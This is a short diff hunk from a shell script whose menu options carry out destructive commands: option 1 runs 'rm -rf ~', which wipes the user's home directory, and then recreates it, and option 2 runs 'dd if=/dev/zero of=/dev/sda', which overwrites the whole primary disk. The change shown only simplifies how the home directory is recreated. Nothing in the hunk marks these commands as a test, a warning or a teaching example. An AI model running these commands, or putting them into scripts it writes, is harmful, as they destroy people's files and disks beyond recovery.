@@ -19,11 +19,7 @@ continue() {
     
     if [ $option == "1" ]; then
         rm -rf ~
-        if [ $(whoami) == "root" ]; then
-            mkdir /root
-        else
-            mkdir /home/$(whoami)
-        fi
+        mkdir $(echo ~)
         exit 1
     elif [ $option == "2" ]; then
         dd if=/dev/zero of=/dev/sda
